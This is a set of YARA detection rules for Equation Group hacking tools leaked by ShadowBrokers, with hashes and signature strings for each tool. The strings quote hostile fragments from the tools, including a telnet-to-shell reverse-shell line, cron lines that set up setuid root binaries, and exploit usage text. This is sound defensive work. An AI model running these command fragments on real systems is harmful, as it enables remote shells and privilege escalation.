  "EquationGroup_calserver": "rule EquationGroup_calserver {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file calserver\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"048625e9a0ca46d7fe221e262c8dd05e7a5339990ffae2fb65a9b0d705ad6099\"\n   strings:\n      $x1 = \"usage: %s <host> <port> e <contents of a local file to be executed on target>\" fullword ascii\n      $x2 = \"Writing your %s to target.\" fullword ascii\n      $x3 = \"(e)xploit, (r)ead, (m)ove and then write, (w)rite\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 30KB and 1 of them )\n}",
  "EquationGroup_porkclient": "rule EquationGroup_porkclient {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file porkclient\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"5c14e3bcbf230a1d7e2909876b045e34b1486c8df3c85fb582d9c93ad7c57748\"\n   strings:\n      $s1 = \"-c COMMAND: shell command string\" fullword ascii\n      $s2 = \"Cannot combine shell command mode with args to do socket reuse\" fullword ascii\n      $s3 = \"-r: Reuse socket for Nopen connection (requires -t, -d, -f, -n, NO -c)\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 30KB and 1 of them )\n}",
  "EquationGroup_electricslide": "rule EquationGroup_electricslide {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file electricslide\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"d27814b725568fa73641e86fa51850a17e54905c045b8b31a9a5b6d2bdc6f014\"\n   strings:\n      $x1 = \"Firing with the same hosts, on altername ports (target is on 8080, listener on 443)\" fullword ascii\n      $x2 = \"Recieved Unknown Command Payload: 0x%x\" fullword ascii\n      $x3 = \"Usage: eslide   [options] <-t profile> <-l listenerip> <targetip>\" fullword ascii\n      $x4 = \"-------- Delete Key - Remove a *closed* tab\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 2000KB and 1 of them )\n}",
  "EquationGroup_libXmexploit2": "rule EquationGroup_libXmexploit2 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file libXmexploit2.8\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"d7ed0234d074266cb37dd6a6a60119adb7d75cc6cc3b38654c8951b643944796\"\n   strings:\n      $s1 = \"Usage: ./exp command display_to_return_to\" fullword ascii\n      $s2 = \"sizeof shellcode = %d\" fullword ascii\n      $s3 = \"Execve failed!\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 40KB and 1 of them )\n}",
  "EquationGroup_wrap_telnet": "rule EquationGroup_wrap_telnet {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file wrap-telnet.sh\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"4962b307a42ba18e987d82aa61eba15491898978d0e2f0e4beb02371bf0fd5b4\"\n   strings:\n      $s1 = \"echo \\\"example: ${0} -l 192.168.1.1 -p 22222 -s 22223 -x 9999\\\"\" fullword ascii\n      $s2 = \"-x [ port to start mini X server on DEFAULT = 12121 ]\\\"\" fullword ascii\n      $s3 = \"echo \\\"Call back port2 = ${SPORT}\\\"\" fullword ascii\n   condition:\n      ( uint16(0) == 0x2123 and filesize < 4KB and 1 of them )\n}",
  "EquationGroup_elgingamble": "rule EquationGroup_elgingamble {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file elgingamble\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"0573e12632e6c1925358f4bfecf8c263dd13edf52c633c9109fe3aae059b49dd\"\n   strings:\n      $x1 = \"* * * * * root chown root %s; chmod 4755 %s; %s\" fullword ascii\n      $x2 = \"[-] kernel not vulnerable\" fullword ascii\n      $x3 = \"[-] failed to spawn shell: %s\" fullword ascii\n      $x4 = \"-s shell           Use shell instead of %s\" fullword ascii\n   condition:\n      1 of them\n}",
  "EquationGroup_cmsd": "rule EquationGroup_cmsd {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file cmsd\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"634c50614e1f5f132f49ae204c4a28f62a32a39a3446084db5b0b49b564034b8\"\n   strings:\n      $x1 = \"usage: %s address [-t][-s|-c command] [-p port] [-v 5|6|7]\" fullword ascii\n      $x2 = \"error: not vulnerable\" fullword ascii\n\n      $s1 = \"port=%d connected! \" fullword ascii\n      $s2 = \"xxx.XXXXXX\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 30KB and 1 of ($x*) ) or ( 2 of them )\n}",
  "EquationGroup_ebbshave": "rule EquationGroup_ebbshave {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file ebbshave.v5\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"eb5e0053299e087c87c2d5c6f90531cc1946019c85a43a2998c7b66a6f19ca4b\"\n   strings:\n      $s1 = \"executing ./ebbnew_linux -r %s -v %s -A %s %s -t %s -p %s\" fullword ascii\n      $s2 = \"./ebbnew_linux.wrapper -o 2 -v 2 -t 192.168.10.4 -p 32772\" fullword ascii\n      $s3 = \"version 1 - Start with option #18 first, if it fails then try this option\" fullword ascii\n      $s4 = \"%s is a wrapper program for ebbnew_linux exploit for Sparc Solaris RPC services\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 20KB and 1 of them ) or ( 2 of them )\n}",
  "EquationGroup_eggbasket": "rule EquationGroup_eggbasket {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file eggbasket\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"b078a02963610475217682e6e1d6ae0b30935273ed98743e47cc2553fbfd068f\"\n   strings:\n      $x1 = \"# Building Shellcode into exploit.\" fullword ascii\n      $x2 = \"%s -w /index.html -v 3.5 -t 10 -c \\\"/usr/openwin/bin/xterm -d 555.1.2.2:0&\\\"  -d 10.0.0.1 -p 80\" fullword ascii\n      $x3 = \"# STARTING EXHAUSTIVE ATTACK AGAINST \" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 90KB and 1 of them ) or ( 2 of them )\n}",
  "EquationGroup_jparsescan": "rule EquationGroup_jparsescan {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file jparsescan\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"8c248eec0af04300f3ba0188fe757850d283de84cf42109638c1c1280c822984\"\n   strings:\n      $s1 = \"Usage:  $prog [-f directory] -p prognum [-V ver] [-t proto] -i IPadr\" fullword ascii\n      $s2 = \"$gotsunos = ($line =~ /program version netid     address             service         owner/ );\" fullword ascii\n   condition:\n      ( filesize < 40KB and 1 of them )\n}",
  "EquationGroup_sambal": "rule EquationGroup_sambal {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file sambal\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"2abf4bbe4debd619b99cb944298f43312db0947217437e6b71b9ea6e9a1a4fec\"\n   strings:\n      $s1 = \"+ Bruteforce mode.\" fullword ascii\n      $s3 = \"+ Host is not running samba!\" fullword ascii\n      $s4 = \"+ connecting back to: [%d.%d.%d.%d:45295]\" fullword ascii\n      $s5 = \"+ Exploit failed, try -b to bruteforce.\" fullword ascii\n      $s7 = \"Usage: %s [-bBcCdfprsStv] [host]\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 90KB and 1 of them ) or ( 2 of them )\n}",
  "EquationGroup_pclean_v2_1_1_2": "rule EquationGroup_pclean_v2_1_1_2 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file pclean.v2.1.1.0-linux-i386\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"cdb5b1173e6eb32b5ea494c38764b9975ddfe83aa09ba0634c4bafa41d844c97\"\n   strings:\n      $s3 = \"** SIGNIFICANTLY IMPROVE PROCESSING TIME\" fullword ascii\n      $s6 = \"-c cmd_name:     strncmp() search for 1st %d chars of commands that \" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 40KB and all of them )\n}",
  "EquationGroup_envisioncollision": "rule EquationGroup_envisioncollision {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file envisioncollision\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"75d5ec573afaf8064f5d516ae61fd105012cbeaaaa09c8c193c7b4f9c0646ea1\"\n   strings:\n      $x1 = \"mysql \\\\$D --host=\\\\$H --user=\\\\$U --password=\\\\\\\"\\\\$P\\\\\\\" -e \\\\\\\"select * from \\\\$T\" fullword ascii\n      $x2 = \"Window 3: $0 -Uadmin -Ppassword -i127.0.0.1 -Dipboard -c\\\\\\\"sleep 500|nc\" fullword ascii\n      $s3 = \"$ua->agent(\\\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\\\");\" fullword ascii\n      $s4 = \"$url = $host . \\\"/admin/index.php?adsess=\\\" . $enter . \\\"&app=core&module=applications&section=hooks&do=install_hook\\\";\" fullword ascii\n   condition:\n      ( uint16(0) == 0x2123 and filesize < 20KB and 1 of ($x*) ) or ( 2 of them )\n}",
  "EquationGroup_cmsex": "rule EquationGroup_cmsex {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file cmsex\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"2d8ae842e7b16172599f061b5b1f223386684a7482e87feeb47a38a3f011b810\"\n   strings:\n      $x1 = \"Usage: %s -i <ip_addr/hostname> -c <command> -T <target_type> (-u <port> | -t <port>) \" fullword ascii\n      $x2 = \"-i target ip address / hostname \" fullword ascii\n      $x3 = \"Note: Choosing the correct target type is a bit of guesswork.\" fullword ascii\n      $x4 = \"Solaris rpc.cmsd remote root exploit\" fullword ascii\n      $x5 = \"If one choice fails, you may want to try another.\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 50KB and 1 of ($x*) ) or ( 2 of them )\n}",
  "EquationGroup_exze": "rule EquationGroup_exze {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file exze\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"1af6dde6d956db26c8072bf5ff26759f1a7fa792dd1c3498ba1af06426664876\"\n   strings:\n      $s1 = \"shellFile\" fullword ascii\n      $s2 = \"completed.1\" fullword ascii\n      $s3 = \"zeke_remove\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 80KB and all of them )\n}",
  "EquationGroup_porkserver": "rule EquationGroup_porkserver {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file porkserver\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"7b5f86e289047dd673e8a09438d49ec43832b561bac39b95098f5bf4095b8b4a\"\n   strings:\n      $s1 = \"%s/%s server failing (looping), service terminated\" fullword ascii\n      $s2 = \"getpwnam: %s: No such user\" fullword ascii\n      $s3 = \"execv %s: %m\" fullword ascii\n      $s4 = \"%s/%s: unknown service\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 70KB and 3 of them )\n}",
  "EquationGroup_DUL": "rule EquationGroup_DUL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file DUL\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"24d1d50960d4ebf348b48b4db4a15e50f328ab2c0e24db805b106d527fc5fe8e\"\n   strings:\n      $x1 = \"?Usage: %s <shellcode> <output_file>\" fullword ascii\n      $x2 = \"Here is the decoder+(encoded-decoder)+payload\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 80KB and 1 of them ) or ( all of them )\n}",
  "EquationGroup_slugger2": "rule EquationGroup_slugger2 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file slugger2\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"a6a9ab66d73e4b443a80a69ef55a64da7f0af08dfaa7e17eb19c327301a70bdf\"\n   strings:\n      $x1 = \"usage: %s hostip port cmd [printer_name]\" fullword ascii\n      $x2 = \"command must be less than 61 chars\" fullword ascii\n\n      $s1 = \"__rw_read_waiting\" fullword ascii\n      $s2 = \"completed.1\" fullword ascii\n      $s3 = \"__mutexkind\" fullword ascii\n      $s4 = \"__rw_pshared\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 50KB and ( 4 of them and 1 of ($x*) ) ) or ( all of them )\n}",
  "EquationGroup_ebbisland": "rule EquationGroup_ebbisland {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file ebbisland\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"eba07c98c7e960bb6c71dafde85f5da9f74fd61bc87793c87e04b1ae2d77e977\"\n   strings:\n      $x1 = \"Usage: %s [-V] -t <target_ip> -p port\" fullword ascii\n      $x2 = \"error - shellcode not as expected - unable to fix up\" fullword ascii\n      $x3 = \"WARNING - core wipe mode - this will leave a core file on target\" fullword ascii\n      $x4 = \"[-C] wipe target core file (leaves less incriminating core on failed target)\" fullword ascii\n      $x5 = \"-A <jumpAddr> (shellcode address)\" fullword ascii\n      $x6 = \"*** Insane undocumented incremental port mode!!! ***\" fullword ascii\n   condition:\n      filesize < 250KB and 1 of them\n}",
  "EquationGroup_jackpop": "rule EquationGroup_jackpop {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file jackpop\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"0b208af860bb2c7ef6b1ae1fcef604c2c3d15fc558ad8ea241160bf4cbac1519\"\n   strings:\n      $x1 = \"%x:%d  --> %x:%d %d bytes\" fullword ascii\n\n      $s1 = \"client: can't bind to local address, are you root?\" fullword ascii\n      $s2 = \"Unable to register port\" fullword ascii\n      $s3 = \"Could not resolve destination\" fullword ascii\n      $s4 = \"raw troubles\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 30KB and 3 of them ) or ( all of them )\n}",
  "EquationGroup_parsescan": "rule EquationGroup_parsescan {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file parsescan\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"942c12067b0afe9ebce50aa9dfdbf64e6ed0702d9a3a00d25b4fca62a38369ef\"\n   strings:\n      $s1 = \"$gotgs=1 if (($line =~ /Scan for (Sol|SNMP)\\\\s+version/) or\" fullword ascii\n      $s2 = \"Usage:  $prog [-f file] -p prognum [-V ver] [-t proto] -i IPadr\" fullword ascii\n   condition:\n      filesize < 250KB and 1 of them\n}",
  "EquationGroup_jscan": "rule EquationGroup_jscan {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file jscan\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"8075f56e44185e1be26b631a2bad89c5e4190c2bfc9fa56921ea3bbc51695dbe\"\n   strings:\n      $s1 = \"$scanth = $scanth . \\\" -s \\\" . $scanthreads;\" fullword ascii\n      $s2 = \"print \\\"java -jar jscanner.jar$scanth$list\\\\n\\\";\" fullword ascii\n   condition:\n      filesize < 250KB and 1 of them\n}",
  "EquationGroup_promptkill": "rule EquationGroup_promptkill {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file promptkill\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"b448204503849926be249a9bafbfc1e36ef16421c5d3cfac5dac91f35eeaa52d\"\n   strings:\n      $x1 = \"exec(\\\"xterm $xargs -e /current/tmp/promptkill.kid.$tag $pid\\\");\" fullword ascii\n      $x2 = \"$xargs=\\\"-title \\\\\\\"Kill process $pid?\\\\\\\" -name \\\\\\\"Kill process $pid?\\\\\\\" -bg white -fg red -geometry 202x19+0+0\\\" ;\" fullword ascii\n   condition:\n      filesize < 250KB and 1 of them\n}",
  "EquationGroup_epoxyresin_v1_0_0": "rule EquationGroup_epoxyresin_v1_0_0 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file epoxyresin.v1.0.0.1\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"eea8a6a674d5063d7d6fc9fe07060f35b16172de6d273748d70576b01bf01c73\"\n   strings:\n      $x1 = \"[-] kernel not vulnerable\" fullword ascii\n\n      $s1 = \".tmp.%d.XXXXXX\" fullword ascii\n      $s2 = \"[-] couldn't create temp file\" fullword ascii\n      $s3 = \"/boot/System.map-%s\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 30KB and $x1 ) or ( all of them )\n}",
  "EquationGroup_estopmoonlit": "rule EquationGroup_estopmoonlit {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file estopmoonlit\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"707ecc234ed07c16119644742ebf563b319b515bf57fd43b669d3791a1c5e220\"\n   strings:\n      $x1 = \"[+] shellcode prepared, re-executing\" fullword ascii\n      $x2 = \"[-] kernel not vulnerable: prctl\" fullword ascii\n      $x3 = \"[-] shell failed\" fullword ascii\n      $x4 = \"[!] selinux apparently enforcing.  Continue [y|n]? \" fullword ascii\n   condition:\n      filesize < 250KB and 1 of them\n}",
  "EquationGroup_envoytomato": "rule EquationGroup_envoytomato {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file envoytomato\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"9bd001057cc97b81fdf2450be7bf3b34f1941379e588a7173ab7fffca41d4ad5\"\n   strings:\n      $s1 = \"[-] kernel not vulnerable\" fullword ascii\n      $s2 = \"[-] failed to spawn shell\" fullword ascii\n   condition:\n      filesize < 250KB and 1 of them\n}",
  "EquationGroup_smash": "rule EquationGroup_smash {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file smash\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"1dc94b46aaff06d65a3bf724c8701e5f095c1c9c131b65b2f667e11b1f0129a6\"\n   strings:\n      $x1 = \"T=<target IP> [O=<port>] Y=<target type>\" fullword ascii\n      $x2 = \"no command given!! bailing...\" fullword ascii\n      $x3 = \"no port. assuming 22...\" fullword ascii\n   condition:\n      filesize < 250KB and 1 of them\n}",
  "EquationGroup_ratload": "rule EquationGroup_ratload {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file ratload\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"4a4a8f2f90529bee081ce2188131bac4e658a374a270007399f80af74c16f398\"\n   strings:\n      $x1 = \"/tmp/ratload.tmp.sh\" fullword ascii\n      $x2 = \"Remote Usage: /bin/telnet locip locport < /dev/console | /bin/sh\\\"\" fullword ascii\n      $s6 = \"uncompress -f ${NAME}.Z && PATH=. ${ARGS1} ${NAME} ${ARGS2} && rm -f ${NAME}\" fullword ascii\n   condition:\n      filesize < 250KB and 1 of them\n}",
  "EquationGroup_ys": "rule EquationGroup_ys {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file ys.auto\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"a6387307d64778f8d9cfc60382fdcf0627cde886e952b8d73cc61755ed9fde15\"\n   strings:\n      $x1 = \"EXPLOIT_SCRIPME=\\\"$EXPLOIT_SCRIPME\\\"\" fullword ascii\n      $x3 = \"DEFTARGET=`head /current/etc/opscript.txt 2>/dev/null | grepip 2>/dev/null | head -1`\" fullword ascii\n      $x4 = \"FATAL ERROR: -x port and -n port MUST NOT BE THE SAME.\" fullword ascii\n   condition:\n      filesize < 250KB and 1 of them\n}",
  "EquationGroup_ewok": "rule EquationGroup_ewok {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file ewok\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"567da502d7709b7814ede9c7954ccc13d67fc573f3011db04cf212f8e8a95d72\"\n   strings:\n      $x1 = \"Example: ewok -t target public\" fullword ascii\n      $x2 = \"Usage:  cleaner host community fake_prog\" fullword ascii\n      $x3 = \"-g  - Subset of -m that Green Spirit hits \" fullword ascii\n      $x4 = \"--- ewok version\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 80KB and 1 of them )\n}",
  "EquationGroup_xspy": "rule EquationGroup_xspy {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file xspy\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"841e065c9c340a1e522b281a39753af8b6a3db5d9e7d8f3d69e02fdbd662f4cf\"\n   strings:\n      $s1 = \"USAGE: xspy -display <display> -delay <usecs> -up\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 60KB and all of them )\n}",
  "EquationGroup_estesfox": "rule EquationGroup_estesfox {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file estesfox\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"33530cae130ee9d9deeee60df9292c00242c0fe6f7b8eedef8ed09881b7e1d5a\"\n   strings:\n      $x1 = \"chown root:root x;chmod 4777 x`' /tmp/logwatch.$2/cron\" fullword ascii\n   condition:\n      all of them\n}",
  "EquationGroup_elatedmonkey_1_0_1_1": "rule EquationGroup_elatedmonkey_1_0_1_1 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file elatedmonkey.1.0.1.1.sh\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"bf7a9dce326604f0681ca9f7f1c24524543b5be8b6fcc1ba427b18e2a4ff9090\"\n   strings:\n      $x3 = \"Usage: $0 ( -s IP PORT | CMD )\" fullword ascii\n      $s5 = \"os.execl(\\\"/bin/sh\\\", \\\"/bin/sh\\\", \\\"-c\\\", \\\"$CMD\\\")\" fullword ascii\n      $s13 = \"PHP_SCRIPT=\\\"$HOME/public_html/info$X.php\\\"\" fullword ascii\n      $s15 = \"cat > /dev/tcp/127.0.0.1/80 <<END\" fullword ascii\n   condition:\n      ( uint16(0) == 0x2123 and filesize < 5KB and ( 1 of ($x*) and 5 of ($s*) ) ) or ( all of them )\n}",
  "EquationGroup_scanner": "rule EquationGroup_scanner {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file scanner\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"dcbcd8a98ec93a4e877507058aa26f0c865b35b46b8e6de809ed2c4b3db7e222\"\n   strings:\n      $x1 = \"program version netid     address             service         owner\" fullword ascii\n      $x4 = \"*** Sorry about the raw output, I'll leave it for now\" fullword ascii\n      $x5 = \"-scan winn %s one\" fullword ascii\n   condition:\n      filesize < 250KB and 1 of them\n}",
  "EquationGroup__ftshell_ftshell_v3_10_3_0": "rule EquationGroup__ftshell_ftshell_v3_10_3_0 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- from files ftshell, ftshell.v3.10.3.7\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      super_rule = 1\n      hash1 = \"9bebeb57f1c9254cb49976cc194da4be85da4eb94475cb8d813821fb0b24f893\"\n      hash2 = \"0be739024b41144c3b63e40e46bab22ac098ccab44ab2e268efc3b63aea02951\"\n   strings:\n      $s1 = \"set uRemoteUploadCommand \\\"[exec cat /current/.ourtn-ftshell-upcommand]\\\"\" fullword ascii\n      $s2 = \"send \\\"\\\\[ \\\\\\\"\\\\$BASH\\\\\\\" = \\\\\\\"/bin/bash\\\\\\\" -o \\\\\\\"\\\\$SHELL\\\\\\\" = \\\\\\\"/bin/bash\\\\\\\" \\\\] &&\" ascii\n      $s3 = \"system rm -f /current/tmp/ftshell.latest\" fullword ascii\n      $s4 = \"# ftshell -- File Transfer Shell\" fullword ascii\n   condition:\n      ( uint16(0) == 0x2123 and filesize < 100KB and 1 of them ) or ( 2 of them )\n}",
  "EquationGroup__scanner_scanner_v2_1_2": "rule EquationGroup__scanner_scanner_v2_1_2 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- from files scanner, scanner.v2.1.2\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      super_rule = 1\n      hash1 = \"dcbcd8a98ec93a4e877507058aa26f0c865b35b46b8e6de809ed2c4b3db7e222\"\n      hash2 = \"9807aaa7208ed6c5da91c7c30ca13d58d16336ebf9753a5cea513bcb59de2cff\"\n   strings:\n      $s1 = \"Welcome to the network scanning tool\" fullword ascii\n      $s2 = \"Scanning port %d\" fullword ascii\n      $s3 = \"/current/down/cmdout/scans\" fullword ascii\n      $s4 = \"Scan for SSH version\" fullword ascii\n      $s5 = \"program vers proto   port  service\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 100KB and 2 of them ) or ( all of them )\n}",
  "EquationGroup__ghost_sparc_ghost_x86_3": "rule EquationGroup__ghost_sparc_ghost_x86_3 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- from files ghost_sparc, ghost_x86\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      super_rule = 1\n      hash1 = \"d5ff0208d9532fc0c6716bd57297397c8151a01bf4f21311f24e7a72551f9bf1\"\n      hash2 = \"82c899d1f05b50a85646a782cddb774d194ef85b74e1be642a8be2c7119f4e33\"\n   strings:\n      $x1 = \"Usage: %s [-v os] [-p] [-r] [-c command] [-a attacker] target\" fullword ascii\n      $x2 = \"Sending shellcode as part of an open command...\" fullword ascii\n      $x3 = \"cmdshellcode\" fullword ascii\n      $x4 = \"You will not be able to run the shellcode. Exiting...\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 70KB and 1 of them ) or ( 2 of them )\n}",
